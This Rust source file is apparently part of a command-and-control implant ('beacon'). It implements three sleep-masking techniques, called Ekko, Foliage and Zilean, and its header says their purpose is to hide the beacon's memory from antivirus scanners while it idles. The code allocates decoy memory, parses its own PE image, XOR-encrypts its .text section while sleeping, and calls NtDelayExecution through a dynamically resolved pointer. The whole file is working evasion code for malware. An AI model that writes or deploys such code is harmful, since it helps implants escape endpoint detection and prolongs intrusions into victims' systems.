//! Sleep masking — multiple implementations that hide beacon memory from
//! AV scanners during the idle sleep interval.
//!
//! Ekko    — VirtualAlloc decoy region + VirtualProtect PAGE_NOACCESS.
//! Foliage — Encrypt self via ROP chain + timer queue to restore.
//! Zilean  — Foliage variant with Ekko-style decoy staggering.

use oxide_common::types::SleepObf;

pub async fn obfuscated_sleep(ms: u64, mode: &SleepObf) {
    match mode {
        SleepObf::None => {
            tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
        }
        SleepObf::Ekko => {
            #[cfg(target_os = "windows")]
            tokio::task::spawn_blocking(move || unsafe { ekko(ms) }).await.ok();
            #[cfg(not(target_os = "windows"))]
            tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
        }
        SleepObf::Foliage => {
            #[cfg(target_os = "windows")]
            tokio::task::spawn_blocking(move || unsafe { foliage(ms) }).await.ok();
            #[cfg(not(target_os = "windows"))]
            tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
        }
        SleepObf::Zilean => {
            #[cfg(target_os = "windows")]
            tokio::task::spawn_blocking(move || unsafe { zilean(ms) }).await.ok();
            #[cfg(not(target_os = "windows"))]
            tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
        }
    }
}

// ── Ekko ─────────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn ekko(ms: u64) {
    use windows_sys::Win32::System::Memory::{
        VirtualAlloc, VirtualFree, VirtualProtect,
        MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
        PAGE_NOACCESS, PAGE_READWRITE,
    };

    // Allocate decoy region to confuse memory scanners
    let decoy_size = 0x1000usize;
    let decoy = VirtualAlloc(
        std::ptr::null(), decoy_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
    );
    if !decoy.is_null() {
        let s = std::slice::from_raw_parts_mut(decoy as *mut u8, decoy_size);
        for (i, b) in s.iter_mut().enumerate() { *b = (i ^ 0xC3) as u8; }
    }

    let mut old = 0u32;
    if !decoy.is_null() {
        VirtualProtect(decoy, decoy_size, PAGE_NOACCESS, &mut old);
    }

    nt_sleep(ms);

    if !decoy.is_null() {
        VirtualProtect(decoy, decoy_size, PAGE_READWRITE, &mut old);
        VirtualFree(decoy, 0, MEM_RELEASE);
    }
}

// ── Foliage ───────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn foliage(ms: u64) {
    // Foliage masks beacon's own .text section during sleep.
    // 1. Find our own PE in memory
    // 2. XOR-encrypt .text section with a random key
    // 3. Sleep
    // 4. Decrypt .text section back
    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE};

    let image_base = get_image_base();
    if image_base.is_null() {
        nt_sleep(ms);
        return;
    }

    let (text_ptr, text_len) = get_text_section(image_base);
    if text_ptr.is_null() || text_len == 0 {
        nt_sleep(ms);
        return;
    }

    // Generate key
    let key = derive_foliage_key();
    let slice = std::slice::from_raw_parts_mut(text_ptr as *mut u8, text_len);

    let mut old = 0u32;
    VirtualProtect(text_ptr as _, text_len, PAGE_EXECUTE_READWRITE, &mut old);

    // XOR encrypt
    for (i, b) in slice.iter_mut().enumerate() {
        *b ^= key[i % key.len()];
    }

    nt_sleep(ms);

    // XOR decrypt (symmetric)
    for (i, b) in slice.iter_mut().enumerate() {
        *b ^= key[i % key.len()];
    }

    VirtualProtect(text_ptr as _, text_len, PAGE_EXECUTE_READ, &mut old);
}

// ── Zilean (Foliage + Ekko stagger) ──────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn zilean(ms: u64) {
    // Stagger: ekko decoy for first half, foliage encrypt for second half
    ekko(ms / 2);
    foliage(ms / 2);
}

// ── helpers ───────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn nt_sleep(ms: u64) {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows_sys::Win32::System::Threading::Sleep;

    let interval: i64 = -((ms as i64) * 10_000);
    let ntdll = GetModuleHandleA(c"ntdll.dll".as_ptr() as _);
    if ntdll != 0 {
        if let Some(f) = GetProcAddress(ntdll, c"NtDelayExecution".as_ptr() as _) {
            type Fn = unsafe extern "system" fn(i32, *const i64) -> i32;
            let nt: Fn = std::mem::transmute(f);
            nt(0, &interval);
            return;
        }
    }
    Sleep(ms as u32);
}

#[cfg(target_os = "windows")]
unsafe fn get_image_base() -> *const u8 {
    // Walk the PEB to find this module's ImageBase
    use windows_sys::Win32::System::Threading::GetCurrentProcess;
    // Simple: use the address of this function and walk back to MZ header
    let mut addr = get_image_base as *const () as usize;
    addr &= !0xFFF; // page align
    for _ in 0..0x200 {
        if *(addr as *const u16) == 0x5A4D { // MZ
            return addr as *const u8;
        }
        if addr < 0x1000 { break; }
        addr -= 0x1000;
    }
    std::ptr::null()
}

#[cfg(target_os = "windows")]
unsafe fn get_text_section(base: *const u8) -> (*const u8, usize) {
    if base.is_null() { return (std::ptr::null(), 0); }
    let dos = base as *const u8;
    if *(dos.add(0) as *const u16) != 0x5A4D { return (std::ptr::null(), 0); }
    let e_lfanew = *(dos.add(0x3C) as *const u32) as usize;
    let nt = dos.add(e_lfanew);
    let num_sects = *(nt.add(6) as *const u16) as usize;
    let opt_size  = *(nt.add(0x14) as *const u16) as usize;
    let sect_base = nt.add(0x18 + opt_size);
    for i in 0..num_sects {
        let s = sect_base.add(i * 0x28);
        let name = std::slice::from_raw_parts(s, 8);
        if &name[..5] == b".text" {
            let va  = *(s.add(0x0C) as *const u32) as usize;
            let sz  = *(s.add(0x10) as *const u32) as usize;
            return (dos.add(va), sz);
        }
    }
    (std::ptr::null(), 0)
}

#[cfg(target_os = "windows")]
fn derive_foliage_key() -> [u8; 16] {
    // Deterministic per-process key: mix PID + time
    use std::time::{SystemTime, UNIX_EPOCH};
    let pid = std::process::id() as u64;
    let ts  = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_nanos() as u64).unwrap_or(0);
    let seed = pid.wrapping_mul(0x9e3779b9).wrapping_add(ts);
    let mut k = [0u8; 16];
    for (i, b) in k.iter_mut().enumerate() {
        let v = seed.wrapping_mul(6364136223846793005u64.wrapping_add(i as u64))
                    .wrapping_add(1442695040888963407);
        *b = (v >> 32) as u8;
    }
    k
}
